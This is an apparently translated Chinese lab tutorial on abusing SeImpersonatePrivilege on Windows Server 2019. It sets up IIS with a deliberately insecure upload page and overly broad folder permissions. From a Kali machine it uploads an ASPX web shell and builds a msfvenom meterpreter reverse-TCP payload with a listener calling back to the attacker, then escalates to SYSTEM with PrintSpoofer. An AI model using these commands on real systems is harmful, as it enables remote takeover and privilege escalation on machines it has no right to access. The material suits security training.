> 在本文中，我们将展示在运行 Windows Server 2019 计算机的 IIS 服务器上创建实验室环境的过程。设置 IIS
> 服务器后，我们将重点介绍使用 SeImpersontePrivilege 或 Impersonate a Client After
> Authentication”用户权限，以使用不同的方法提升机器上的访问权限。

## 目录

 **介绍**

 **实验室设置**

> IIS安装
>
> 添加上传功能
>
> 更改权限

 **IIS服务器的利用**

 **使用 PrintSpoofer 提升权限**

 **结论**

## 介绍

谈到SeImpersonatePrivilege（身份验证后模拟客户端），它是在Windows 2000 SP4
中引入的。被分配此权限的用户是设备本地管理员组的成员和设备的本地服务帐户。除了这些用户和组之外，以下组件也具有此用户权限： 由服务控制管理器组件对象模型
(COM) 服务器启动的服务由 COM 基础结构启动并配置为在特定帐户下运行
现在我们知道哪些类型的用户拥有此特权，是时候了解用户使用这些特权获得什么了。每当为用户分配 SeImpersontatePrivilege
时，就允许该用户代表该用户运行程序以模拟客户端。

现在我们对SeImpersontatePrivilege 有了一定的了解。现在让我们深入了解实验室设置。我们将在进行时讨论这个问题。

## 实验室设置

正如我们从简介中了解到的，这种权限是针对本地管理员或具有类似角色的用户设置的。因此，为了复制该漏洞，我们将使用带有 AD 的 Window Server
2019。当微软修补漏洞时，我们将使用 Build 17763，如下图所示。

    
    
     **系统信息**

![1628348447_610ea01fac39c7271e9e8.png!small?1628348448500](https://image.3001.net/images/20210807/1628348447_610ea01fac39c7271e9e8.png!small?1628348448500)

###  **IIS安装**

我们将通过在我们的机器上安装 IIS 服务器来获得特定的权限。要配置 IIS
服务器，我们需要打开服务器管理器并从快速启动菜单中选择添加角色和功能，如下图所示。

![1628348454_610ea02624a03f53d104a.png!small?1628348454450](https://image.3001.net/images/20210807/1628348454_610ea02624a03f53d104a.png!small?1628348454450)

这将打开安装向导。我们在没有做任何更改的情况下浏览了“开始之前”部分。现在我们看到了安装类型部分，我们将继续选择基于角色或基于功能的安装选项。

![1628348460_610ea02c551672d77136e.png!small?1628348460683](https://image.3001.net/images/20210807/1628348460_610ea02c551672d77136e.png!small?1628348460683)

同样，我们正在轻松完成服务器选择，因为这对于每个用户都是不同的，因为它基于您为服务器提供的名称及其后续森林。我们进入服务器角色部分。在这里，我们可以选择
Web 服务器 (IIS)，如下所示。

![1628349212_610ea31c2f6d1dbb95102.png!small?1628349212524](https://image.3001.net/images/20210807/1628349212_610ea31c2f6d1dbb95102.png!small?1628349212524)

按下一步按钮将引导我们进入功能部分。在这里，我们必须确保我们有一些使 IIS 正常运行所需的依赖项。它包括 .NET Framework
4.7；有可能它会默认安装。但除此之外，我们需要安装 ASP .NET 4.7，在 WCF 服务下，我们有 HTTP 激活和 TCP
端口共享。同样，如果您已经安装了某些东西，可以通过单击下一步继续。

![1628349272_610ea3588908d1f7d2a96.png!small?1628349272852](https://image.3001.net/images/20210807/1628349272_610ea3588908d1f7d2a96.png!small?1628349272852)

现在，我们有了要安装的基于角色的服务的部分。除了我们将选择的 Web 服务器及其包含常见 HTTP
功能、运行状况和诊断、性能和安全组件的组件之外，还会自动选择一些组件，如下图所示。

![1628349281_610ea3611eb3189359401.png!small?1628349281370](https://image.3001.net/images/20210807/1628349281_610ea3611eb3189359401.png!small?1628349281370)

最后，我们有确认部分。在这里，我们可以验证我们要安装的所有服务和组件。您可以通过单击“安装”按钮继续安装。

![1628349320_610ea388c5d7a5d565b02.png!small?1628349321091](https://image.3001.net/images/20210807/1628349320_610ea388c5d7a5d565b02.png!small?1628349321091)

安装过程将运行一段时间，然后您将成功安装 IIS 服务。我们可以通过您选择的 Web 浏览器访问服务器的 IP 地址来查看 IIS
欢迎页面。如果遇到问题，请尝试重新启动 IIS 服务或服务器本身。

![1628349390_610ea3ce2a547c7db9f79.png!small?1628349390418](https://image.3001.net/images/20210807/1628349390_610ea3ce2a547c7db9f79.png!small?1628349390418)

###  **添加上传功能**

与 Linux HTTP 服务器中的 /var/www/html 类似，我们在 inetpub/wwwroot 位置中有等效项。它将具有我们之前在 Web
浏览器上查看的欢迎页面。在这个阶段，我们想将上传功能添加到我们的 IIS
服务器上。为此，我们创建了一些网页和脚本。我们不会在这里详细解释这些。但是，如果您想在部署中添加这些文件，请从我们的 **[GitHub
存储库](https://github.com/Ignitetechnologies/Windows-Privilege-Escalation-SeImpersontatePrivilege.git)** 下载文件并将这些文件提取到 wwwroot 目录中，以复制如下所示的图像。

![1628349396_610ea3d49f71e7802ad31.png!small?1628349396879](https://image.3001.net/images/20210807/1628349396_610ea3d49f71e7802ad31.png!small?1628349396879)

要访问我们 ISS 服务器上的 CS.aspx，我们将编辑 iisstart HTML 页面。第一次打开文件时，您会看到一些评论和 Microsoft
官方链接。我们删除了这些数据并添加了我们服务器的静态地址，后跟 aspx 文件的名称。当我们单击用于重定向到 Microsoft
主页的欢迎页面时，这将使我们的 CS.aspx 网页可访问。我们这样做是为了使我们的应用程序易于访问。

![1628349401_610ea3d90660c6b89d17a.png!small?1628349401236](https://image.3001.net/images/20210807/1628349401_610ea3d90660c6b89d17a.png!small?1628349401236)

###  **更改权限**

添加带有上传功能的网页的过程还没有结束，我们需要更改权限，以便我们可以访问网页并上传文件。要更改权限，我们打开 IIS
管理器。在右侧菜单中，我们有图中突出显示的“编辑权限”选项。

![1628349503_610ea43fb976e0bed1c1f.png!small?1628349504062](https://image.3001.net/images/20210807/1628349503_610ea43fb976e0bed1c1f.png!small?1628349504062)

这将打开 wwwroot 目录权限。在这里，我们允许域的用户完全控制具有 wwwroot 目录的修改访问权限。但是，存在一种更安全的方法，即为 IIS
服务器的管理创建一个专用用户并为该特定用户添加受限权限。但是，为了时间和方便，我们正在为所有用户申请许可。

![1628349517_610ea44d08cd8fad01b27.png!small?1628349517266](https://image.3001.net/images/20210807/1628349517_610ea44d08cd8fad01b27.png!small?1628349517266)

## 利用 IIS 服务器

现在我们已经启动并运行了 IIS 服务器。尽管我们必须提到，如果您的 IIS 服务器未按预期工作，请尝试重新启动 IIS 服务或服务器本身。继续，为了利用
IIS 服务器，我们添加了文件上传功能。转到我们的攻击者机器，即 Kali 机器。在这里，我们在网络中也设置了 Kali 机器，这样就可以通过 Kali
上的 Web 浏览器访问 IIS 服务。我们浏览文件上传功能并上传位于网页上 /usr/share/webshel​​ls/aspx/cmdasp.aspx
的 ASP 命令外壳，如下图所示。

![1628349537_610ea461da6d178b27d35.png!small?1628349538133](https://image.3001.net/images/20210807/1628349537_610ea461da6d178b27d35.png!small?1628349538133)

单击“上传”按钮，我们将成功上传文件。这只是一个演示；在上传 shell 之前，现实生活场景将具有额外的安全性和步骤。

![1628349545_610ea469dfcadb6d48c53.png!small?1628349546142](https://image.3001.net/images/20210807/1628349545_610ea469dfcadb6d48c53.png!small?1628349546142)

根据提供上传功能的文件的编程，上传的文件将被放置在上传目录中。因此，我们可以通过浏览 /Uploads/cmdasp.aspx 来访问上传的
shell，如图所示。这里我们有一个字段，可用于在目标机器上运行命令。我们通过运行 net user 命令演示了这一点。

![1628349552_610ea470675e98587d36d.png!small?1628349552640](https://image.3001.net/images/20210807/1628349552_610ea470675e98587d36d.png!small?1628349552640)

现在我们已经测试了我们可以上传 shell 并执行命令，是时候利用系统并在目标机器上获得一个meterpreter了。这意味着我们需要使用 msfvenom
或您选择的任何其他工具创建有效负载。我们将我们的有效载荷命名为 shell.exe

    
    
     **msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.2 lport=1234 -f exe > shell.exe**

![1628349745_610ea531b9d4ac420eb0f.png!small?1628349745981](https://image.3001.net/images/20210807/1628349745_610ea531b9d4ac420eb0f.png!small?1628349745981)

成功创建有效载荷后，我们将像之前使用 aspx shell 一样上传有效载荷。我们可以看到可执行payload已经成功上传到目标机器上。

![1628349751_610ea5376bf2493dce88e.png!small?1628349751663](https://image.3001.net/images/20210807/1628349751_610ea5376bf2493dce88e.png!small?1628349751663)

现在要生成meterpreter shell，我们还需要执行payload。因此，我们将使用 aspx shell 浏览上传的可执行 shell.exe
文件的路径，如下图所示。

![1628349757_610ea53d1c0880bcb93b1.png!small?1628349757293](https://image.3001.net/images/20210807/1628349757_610ea53d1c0880bcb93b1.png!small?1628349757293)

在执行有效载荷之前，我们需要创建一个侦听器，用于捕获从有效载荷生成的 Meterpreter 反向 shell。我们需要提供与使用 msfvenom
制作有效载荷时使用的相同配置。接下来，我们将使用 aspx shell 在机器上利用有效负载并接收 meterpreter
shell。由于我们在这篇文章中关注的是权限，因此我们运行 getprivs
命令来获取在目标机器上启用的权限。我们可以看到在目标机器上启用了有问题的特权，即 SeImpersontatePrivilege。

    
    
     **msfconsole
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost 192.168.1.2
    set lport 1234
    exploit
    getprivs**

![1628349764_610ea544ba2dcb8dad0e6.png!small?1628349765052](https://image.3001.net/images/20210807/1628349764_610ea544ba2dcb8dad0e6.png!small?1628349765052)

尽管您不需要依赖 Metepreter shell 的 getprivs 命令。您可以在 whoami 命令的帮助下检查启用的权限，并添加 /priv
选项，如下图所示。我们可以看到，我们通过利用获得的会话是针对用户 iisapppool 的。

>  **shell**
>
>  **whoami /priv**
>
>  **whoami**

![1628349773_610ea54db6f2f56cdf764.png!small?1628349774048](https://image.3001.net/images/20210807/1628349773_610ea54db6f2f56cdf764.png!small?1628349774048)

## 使用 PrintSpoofer 提升权限

在野外滥用以利用我们在本文中讨论的特权的关键资源之一称为
PrintSpoofer。您可以从[GitHub](https://github.com/itm4n/PrintSpoofer)获取源代码和准备部署的可执行文件.
该工具相对较新，但它用于提升访问权限的技术已经过时。要了解此工具如何利用
SeImpersontatePrivilege，我们将了解此权限提供的访问权限。正如我们在介绍中所讨论的，此权限允许用户创建具有其他用户访问权限的进程。因此，PrintSpoofer
利用它来提升对 NT Authority 的整体访问权限。在下面的演示中，我们将移至 Public 目录，因为它将具有上传 PrintSpoofer
可利用文件所需的写入权限。然后在上传可执行文件后，我们移动到目标机器上的命令外壳，在列出内容后我们可以看到 PrintSpoofer 可执行文件的传输成功。

![1628350251_610ea72bf100776dfdb51.png!small?1628350252211](https://image.3001.net/images/20210807/1628350251_610ea72bf100776dfdb51.png!small?1628350252211)

使用 PrintSpoofer 漏洞利用非常简单，因为只需要两个参数：-I 用于告诉可执行文件提供交互式会话，-c
用于提供您希望在利用后获得的访问权限。当我们在目标机器上运行这个命令时，我们可以看到它搜索
SeImpersontatePrivilege，然后检查命名管道。随着这些步骤的成功，它继续创建我们提供的 -c 选项作为 NT
权限令牌或访问的过程。我们可以看到生成了一个新的命令 shell 实例，当我们运行 whoami
命令时，我们可以看到我们已经成功提升了我们在目标机器上的权限。

    
    
     **PrintSpoofer64.exe -i -c cmd
    whoami**

![1628350260_610ea734ae60d48e5c679.png!small?1628350260898](https://image.3001.net/images/20210807/1628350260_610ea734ae60d48e5c679.png!small?1628350260898)

## 结论

> 这是值得研究和撰写的有趣帖子之一。在研究过程中，很明显，虽然有许多使用各种工具来利用机器上的 SeImpersontatePrivilege
> 的指南，但没有一个资源显示我们如何首先获得这些权限。我希望该资源可以帮助您掌握利用 SeImpersontatePrivilege 背后的概念和方法。

